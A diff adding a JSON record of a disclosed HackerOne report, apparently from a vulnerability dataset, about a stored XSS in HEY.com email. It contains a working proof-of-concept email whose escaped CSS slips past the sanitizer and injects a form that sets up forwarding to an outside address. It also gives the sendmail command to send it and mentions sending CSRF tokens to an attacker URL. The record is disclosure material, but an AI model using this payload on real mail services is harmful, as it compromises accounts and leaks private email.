@@ -1,0 +1,51 @@
+{
+    "reported_to": "Basecamp",
+    "reported_by": "jouko ",
+    "title": "HEY.com email stored XSS",
+    "content": "\nAn attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.\nTo reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.\nExample email:\nCode 547 Bytes\n1From: jouko@klikki.fi\n2To: jouko@hey.com\n3Subject: HackerOne test\n4MIME-Version: 1.0\n5Content-type: text/html\n6\n7<style>\n8url(cid://\\00003c\\000027message-content\\00003e\\00003ctemplate\\00003e\\00003cstyle\\00003exxx);\n9url(cid://\\00003c/style\\00003e\\00003c/template\\00003e\\00003c/message-content\\00003e\\00003cform\\000020action=/my/accounts/266986/forwardings/outbounds\\000020data-controller=beacon\\00003e\\00003cinput\\000020type=text\\000020name=contact_outbound_forwarding[to_email_address]\\000020value=joukop@gmail.com\\00003e\\00003c/form\\00003exxx);\n10</style>\nTo send the email, create a text file with the above contents. Send it with the command\nCode 33 Bytes\n1/usr/sbin/sendmail -t < email.txt\nThe backslashes in the <style> tag are decoded. The first \\000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.\nFinally, HTML like this is injected:\nCode 185 Bytes\n1<form action=\"/my/accounts/266986/forwardings/outbound\" data-controller=\"beacon\">\n2<input type=text name=\"contact_outbound_forwarding[to_email_address]\" value=\"joukop@gmail.com\">\n3</form>\nThis exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.\nThis is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).\nAnother example is to simply set the form action to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.\n<image_0>\nIf you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.\nImpact\nA HEY user viewing an email sent by the attacker may have their account compromised.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 5000,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EucnSJSAyvKCmFeSUpQb3aSP?response-content-disposition=attachment%3B%20filename%3D%22hey.png%22%3B%20filename%2A%3DUTF-8%27%27hey.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7TQC2VD6%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T222946Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCYDwKXk5Alyw%2B6%2BX%2BlVXoBMf4XmCPCsq5EwXvZPLtgCQIgT%2FrZMWp7e3s3CKA3loVFAhhhXbt%2FTaX3S0aqtxP3aDUqsgUIGxADGgwwMTM2MTkyNzQ4NDkiDJScpqQPy3cyUv4zlyqPBSr6nPfyuLwmw45DDK%2FT5zEBZh27hxvsarhrpINU7peZkWTDJ50AHazM%2F7FxK7Ggbk3RO4v9b%2Fix7IHG7vKHYIp88zvv8SDdB5SbN4eAJ3l7oDs6TIKgdD6a1o%2B0Wn95z7oyrL9ybb4BDUp3oG4wGCgJDrKxhE3OrsoQyW38yGPJ2q%2BaEtAom%2BCR6Lzozu48pKS8JZ5yhVqDdBREfR00o8uT%2B5LxjYK0z7B9DbJzaXGzucqw918zU%2FcNCGf7x4tA1P0rPoNKvDyGlNvFahv7K86Rbfy8Vhg2e8mt4eCuTCgHRnFHNIdJ4W0CtKoxmV%2FTDHkGmVhq92S4OO9dH28ap3nBPbEXhl2tot7zwI32u%2FNyqSbaYHwdfgL5oDPoTiacSeyzEgiSvhCZzUJiPdGoyG5kZ%2FmyHekN%2BCsc2J9nlvGoywZD2uNvs1cQ6q4%2BTbf9mNPWgrTwaYHxTv7FtRExNL8NCq5OzhPAgevBkUjclKjv8DXCHvUzOLikoOrfIZ5MacV9MmCficRevsX13eP1qpkmHRsxWKvpIlRLIR1alhcx83TV7ylzbHbnzRCjcw1tfyNndJ3c5pcHuU3pmrax8ETBLR9ZIU1eObuDhaInzn8JM0vK9e7jiA3hC35si1e6UFoAiysum4sB7FTJd6DGETvrjcWf4barRplQ%2BcN%2FH9EFxsBh49gRR52os49H%2FSWCssFiomopx4UKeke9y7rFiLVp9QGrBSs5sttQ%2B6FmN9TlFnBRLiigGw95vpjQh3iLWIbdWrzq2cG8u42hpA7pcVrnVbbdX6mAP4UK6rC733Ld%2BB0y2yXi7CMbs7PxFxEdw8%2BfcFruwatDvlSZIsAMlYPgkWxvOJy7cemU6JKKcNYwr86LvwY6sQHdH5QGntFNiTGshX463%2BxLxFkye8af3crmCWRzuYrGwuWkalhbznlubOWpcKblYQgmaSubcFkeLHGhe1Nj97yMCKMd%2FuF9D79i9ovcfO0PJY%2FFHBNP6Pc8mFsTaDfsId48c8crslltNM1gtyhNOdqzzEPMM2RlA6enaLl4hUC8DbCZRSCvSPmgCVVYknlzADOx92QDmt3EZ%2Fop6BdkyzmOh04tfZ0YAXvLvRyz%2BTchNRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=747ad7a8b51d4075436d9ae17ed58177022dcff7c641f2a599b7b110d03d3607"
+    },
+    "disclosed_date": 1603836360,
+    "report_url": "https://hackerone.com/reports/982291",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create a text file with the email content including the malicious HTML and CSS."
+        ],
+        [
+            2,
+            "Send the email using the sendmail command: `/usr/sbin/sendmail -t < email.txt`."
+        ],
+        [
+            3,
+            "The recipient views the email in HEY.com, triggering the XSS payload."
+        ]
+    ],
+    "vuln_description": "An attacker can bypass HEY.com's HTML sanitizer to inject arbitrary unsafe HTML in emails, leading to stored XSS. This can be exploited to perform actions like setting up email forwarding to an external address or stealing CSRF tokens.",
+    "reason": "The attack involves bypassing HTML sanitization through non-obvious encoding techniques, leveraging shadow DOM elements, and exploiting existing JavaScript controllers. It requires understanding of HTML/CSS encoding, DOM manipulation, and the application's JavaScript framework.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "reason": "The vulnerability involves an XSS attack through email content, which is not directly related to authentication or authorization bypass via session or resource manipulation. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs within the same application, not on detecting XSS vulnerabilities in email content.",
+        "is_detectable": false
+    }
+}
